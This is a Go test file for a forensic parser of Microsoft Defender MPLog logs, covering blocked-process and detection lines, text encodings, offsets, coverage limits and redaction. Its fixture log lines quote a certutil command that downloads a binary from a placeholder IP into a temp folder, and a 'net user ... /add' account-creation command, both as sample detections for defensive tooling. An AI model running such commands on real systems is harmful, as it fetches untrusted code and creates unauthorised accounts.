package defendermplog

import (
	"bytes"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"unicode/utf16"

	"tracefall/internal/model"
)

// The fixture lines follow the layout of a real support log, with neutral values.
const (
	lnSetName = `2026-03-01T10:00:00.100 Engine:Setting original file name "x.exe" for "c:\temp\x.dll", hr=0x0`
	lnReport  = `2026-03-01T10:00:01.200 Engine:command line reported as threat: C:\Windows\System32\cmd.exe(C:\Windows\System32\cmd.exe /c certutil -urlcache -f http://203.0.113.9/a.bin c:\windows\temp\a.bin)`
	lnBlocked = `2026-03-01T10:00:01.201 [RTP] Process creation blocked: ProcessName: cmd.exe, ProcessId: 4242, ProcessCreationTime:134000000000000000, Parent Pid: 1234, ParentProcessCreationTime:133900000000000000, Reason: 3`
	lnDetect  = `2026-03-01T10:00:01.300 DETECTIONEVENT MPSOURCE_SYSTEM Trojan:Win32/Example.A CmdLine:C:\Windows\System32\cmd.exe /c certutil -urlcache -f http://203.0.113.9/a.bin c:\windows\temp\a.bin;internalCmdLine:i n AQAAAEK2A4ABAAAAAAAAACNOZDzX`
	lnAdd     = `2026-03-01T10:00:01.310 DETECTION_ADD#2 Trojan:Win32/Example.A CmdLine:C:\Windows\System32\cmd.exe /c certutil -urlcache -f http://203.0.113.9/a.bin c:\windows\temp\a.bin PropBag [length: 0, data: (null)]`
	lnLevel   = `ThreatLevel:0`
	lnConfig  = `2026-03-01T10:00:02.000 [RTP] [RtpConfig] Config change detected, type: 32`
	lnAllow   = `2026-03-01T10:00:03.000 Using signature default action MP_THREAT_ACTION_ALLOW(6) for special threatID: 0x9f424b3c7ffffffe`
	lnBadBlk  = `2026-03-01T10:00:04.000 [RTP] Process creation blocked: ProcessName: cmd.exe, ProcessId: abc`
)

func enc16(lines []string, nl string, bom bool) []byte {
	var b []byte
	if bom {
		b = append(b, 0xff, 0xfe)
	}
	for _, l := range lines {
		for _, c := range utf16.Encode([]rune(l + nl)) {
			b = append(b, byte(c), byte(c>>8))
		}
	}
	return b
}

func write(t *testing.T, name string, b []byte) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(p, b, 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

var fixture = []string{"", lnSetName, lnReport, lnBlocked, lnDetect, lnAdd, lnLevel, lnConfig, lnAllow, lnBadBlk}

func TestParseBlockedAndDetectionLines(t *testing.T) {
	raw := enc16(fixture, "\r\n", true)
	res, err := New().Parse(write(t, "MPLog-20260301-100000.log", raw))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Events) != 2 {
		t.Fatalf("got %d events, want 2 (one blocked, one detection)", len(res.Events))
	}
	blk, det := res.Events[0], res.Events[1]

	if blk.EventType != model.EventAntimalwareBlock || blk.ArtifactType != model.ArtifactDefenderMPLog {
		t.Fatalf("blocked event: %q / %q", blk.EventType, blk.ArtifactType)
	}
	want := map[string]string{
		"process_name": "cmd.exe", "process_id": "4242", "parent_pid": "1234", "reason_code": "3",
		"process_creation_time_raw": "134000000000000000", "parent_process_creation_time_raw": "133900000000000000",
		"process_creation_utc_derived": "2025-08-18T14:13:20Z", "parent_creation_utc_derived": "2025-04-24T20:26:40Z",
		"timestamp_local": "2026-03-01T10:00:01.201", "line_number": "4",
	}
	for k, v := range want {
		if blk.Extra[k] != v {
			t.Errorf("blocked Extra[%s] = %q, want %q", k, blk.Extra[k], v)
		}
	}
	if !blk.Timestamp.IsZero() {
		t.Errorf("a zone-less prefix must not become an instant: %v", blk.Timestamp)
	}
	if blk.ProcessName != "cmd.exe" {
		t.Errorf("ProcessName = %q", blk.ProcessName)
	}
	// Blocked creation is never recast as a process start or as a PID join key.
	if blk.EventType == model.EventProcessCreate || blk.PID != 0 || blk.PPID != 0 || blk.CommandLine != "" {
		t.Errorf("blocked record leaked into process fields: pid=%d ppid=%d cmd=%q", blk.PID, blk.PPID, blk.CommandLine)
	}
	if blk.Extra["preceding_threat_report_line"] != "3" {
		t.Errorf("adjacent engine threat report not retained: %q", blk.Extra["preceding_threat_report_line"])
	}
	for _, need := range []string{"blocked", "not a process start"} {
		if !strings.Contains(blk.Extra["limitations"]+blk.Extra["evidence_meaning"], need) {
			t.Errorf("blocked text lacks %q", need)
		}
	}
	if !strings.Contains(blk.Extra["timestamp_basis"], "no zone") {
		t.Errorf("timestamp_basis = %q", blk.Extra["timestamp_basis"])
	}

	if det.EventType != model.EventAntimalwareDetection {
		t.Fatalf("detection event type %q", det.EventType)
	}
	if det.Extra["threat_name"] != "Trojan:Win32/Example.A" || det.Extra["detection_source"] != "MPSOURCE_SYSTEM" || det.Extra["resource_kind"] != "command_line" {
		t.Errorf("detection fields: %+v", det.Extra)
	}
	if got := det.Extra["resource"]; !strings.HasPrefix(got, `CmdLine:C:\Windows\System32\cmd.exe /c certutil`) || strings.Contains(got, "internalCmdLine") || strings.Contains(got, "AQAAAEK2") {
		t.Errorf("resource = %q", got)
	}
	if det.CommandLine != "" || det.FilePath != "" {
		t.Errorf("a CmdLine resource must not populate CommandLine/FilePath")
	}
}

// Offsets are checked against the encoded bytes with an independent search.
func TestCitationLineAndByteOffsetPointAtTheRecord(t *testing.T) {
	for name, tc := range map[string]struct {
		raw []byte
		bom int
	}{
		"utf16le-bom":    {enc16(fixture, "\r\n", true), 2},
		"utf16le-no-bom": {enc16(fixture, "\r\n", false), 0},
	} {
		t.Run(name, func(t *testing.T) {
			res, err := New().Parse(write(t, "MPLog-1.log", tc.raw))
			if err != nil {
				t.Fatal(err)
			}
			if len(res.Events) != 2 {
				t.Fatalf("%d events", len(res.Events))
			}
			for i, line := range []string{lnBlocked, lnDetect} {
				needle := enc16([]string{line}, "", false)
				idx := bytes.Index(tc.raw, needle)
				e := res.Events[i]
				if e.Extra["byte_offset"] != itoa(idx) {
					t.Errorf("event %d byte_offset = %q, want %d", i, e.Extra["byte_offset"], idx)
				}
				if e.SourceReference != "line:"+e.Extra["line_number"] {
					t.Errorf("source ref %q", e.SourceReference)
				}
				if res.Raw[i].SourceReference != e.SourceReference || !strings.Contains(res.Raw[i].Raw, line[:60]) {
					t.Errorf("raw evidence for %d: %+v", i, res.Raw[i])
				}
			}
		})
	}
}

func itoa(n int) string { return strconv.Itoa(n) }

func TestEncodingVariants(t *testing.T) {
	lines := []string{"", lnBlocked, lnDetect}
	utf8 := []byte(strings.Join(lines, "\n") + "\n")
	be := []byte{0xfe, 0xff}
	for _, c := range utf16.Encode([]rune(strings.Join(lines, "\r\n") + "\r\n")) {
		be = append(be, byte(c>>8), byte(c))
	}
	for name, raw := range map[string][]byte{
		"utf16le-bom":  enc16(lines, "\r\n", true),
		"utf16le-bare": enc16(lines, "\r\n", false),
		"utf16be-bom":  be,
		"utf8":         utf8,
		"utf8-bom":     append([]byte{0xef, 0xbb, 0xbf}, utf8...),
		"lf-only":      enc16(lines, "\n", true),
		"no-final-eol": enc16(lines[:2], "\r\n", true)[:len(enc16(lines[:2], "\r\n", true))-4],
	} {
		t.Run(name, func(t *testing.T) {
			res, err := New().Parse(write(t, "MPLog-2.log", raw))
			if err != nil {
				t.Fatal(err)
			}
			want := 2
			if name == "no-final-eol" {
				want = 1
			}
			if len(res.Events) != want {
				t.Fatalf("%d events, want %d", len(res.Events), want)
			}
			if res.Events[0].Extra["process_id"] != "4242" {
				t.Errorf("first event: %+v", res.Events[0].Extra)
			}
		})
	}
}

func TestBenignAndMalformedLinesAreNotEvents(t *testing.T) {
	lines := []string{"", lnSetName, lnAdd, lnLevel, lnConfig, lnAllow}
	res, err := New().Parse(write(t, "MPLog-3.log", enc16(lines, "\r\n", true)))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Events) != 0 {
		t.Fatalf("%d events from non-detection lines: %+v", len(res.Events), res.Events[0].Extra)
	}
	res, err = New().Parse(write(t, "MPLog-4.log", enc16([]string{lnBadBlk}, "\r\n", true)))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Events) != 0 || res.Coverage == nil || res.Coverage.RecordsFailed != 1 {
		t.Fatalf("malformed blocked line: events=%d coverage=%+v", len(res.Events), res.Coverage)
	}
	if !strings.Contains(strings.Join(res.Coverage.Notes, " "), "line 1") {
		t.Errorf("notes must cite the unparsed line: %v", res.Coverage.Notes)
	}
}

func TestCoverageCountsEveryLine(t *testing.T) {
	res, _ := New().Parse(write(t, "MPLog-5.log", enc16(fixture, "\r\n", true)))
	c := res.Coverage
	if c == nil || c.RecordsRead != len(fixture) || c.Mapped != 2 || c.RecordsFailed != 1 || c.LimitReached {
		t.Fatalf("coverage = %+v", c)
	}
}

func TestResourceIsRedacted(t *testing.T) {
	line := `2026-03-01T10:00:01.300 DETECTIONEVENT MPSOURCE_SYSTEM Trojan:Win32/Example.A CmdLine:C:\Windows\System32\cmd.exe /c net user bob Hunter2xyz /add;internalCmdLine:i n AAAA`
	res, _ := New().Parse(write(t, "MPLog-6.log", enc16([]string{line}, "\r\n", true)))
	if len(res.Events) != 1 {
		t.Fatalf("%d events", len(res.Events))
	}
	for k, v := range res.Events[0].Extra {
		if strings.Contains(v, "Hunter2xyz") {
			t.Errorf("secret in Extra[%s]", k)
		}
	}
}

// A file larger than the scan cap is read up to the cap and the rest is said.
func TestOversizedLogIsCappedAndReported(t *testing.T) {
	lines := []string{}
	for i := 0; i < 50; i++ {
		lines = append(lines, lnSetName)
	}
	lines = append(lines, lnBlocked)
	raw := enc16(lines, "\r\n", true)
	p := Parser{maxScanBytes: 2000}
	res, err := p.Parse(write(t, "MPLog-7.log", raw))
	if err != nil {
		t.Fatal(err)
	}
	c := res.Coverage
	if c == nil || !c.LimitReached || len(res.Events) != 0 {
		t.Fatalf("events=%d coverage=%+v", len(res.Events), c)
	}
	if !strings.Contains(strings.Join(c.Notes, " "), "not read") {
		t.Errorf("notes: %v", c.Notes)
	}
}

func TestEventCapIsReported(t *testing.T) {
	var lines []string
	for i := 0; i < 5; i++ {
		lines = append(lines, lnBlocked)
	}
	p := Parser{maxEvents: 3}
	res, _ := p.Parse(write(t, "MPLog-8.log", enc16(lines, "\r\n", true)))
	if len(res.Events) != 3 || !res.Coverage.LimitReached || res.Coverage.Unmapped != 2 {
		t.Fatalf("events=%d coverage=%+v", len(res.Events), res.Coverage)
	}
}

func TestOverlongLineIsTruncatedAndCounted(t *testing.T) {
	long := "2026-03-01T10:00:00.000 Engine:" + strings.Repeat("x", 200000)
	res, err := New().Parse(write(t, "MPLog-9.log", enc16([]string{long, lnBlocked}, "\r\n", true)))
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Events) != 1 || res.Events[0].Extra["line_number"] != "2" {
		t.Fatalf("events=%d", len(res.Events))
	}
	if !strings.Contains(strings.Join(res.Coverage.Notes, " "), "truncated") {
		t.Errorf("notes: %v", res.Coverage.Notes)
	}
}

func TestDetectAndConfirm(t *testing.T) {
	p := New()
	for _, ok := range []string{"MPLog-20261017-221630.log", "mplog-20261017-221630.LOG", "MPDetection-20260828-173151.log", `ProgramData\Microsoft\Windows Defender\Support\MPLog-1.log`} {
		if !p.Detect(ok) {
			t.Errorf("Detect(%q) = false", ok)
		}
	}
	for _, no := range []string{"MpCmdRun.log", "MPLog.txt", "xMPLog-1.log", "MPLog-1.log.gz", "mplog.log", "MPLog-.log"} {
		if p.Detect(no) {
			t.Errorf("Detect(%q) = true", no)
		}
	}
	if p.DetectContent(enc16(fixture, "\r\n", true)) {
		t.Error("DetectContent must be name-only")
	}
	if !p.ConfirmContent(enc16(fixture, "\r\n", true)) || !p.ConfirmContent([]byte(lnBlocked+"\n")) {
		t.Error("a real log header must be confirmed")
	}
	for name, b := range map[string][]byte{
		"empty": nil, "text": []byte("hello world, not a log\n"), "binary": {0, 1, 2, 3, 4, 5, 6, 7},
		"other timestamps": []byte("Mon Jan 2 2006 15:04:05 something\n"),
	} {
		if p.ConfirmContent(b) {
			t.Errorf("%s was confirmed", name)
		}
	}
}
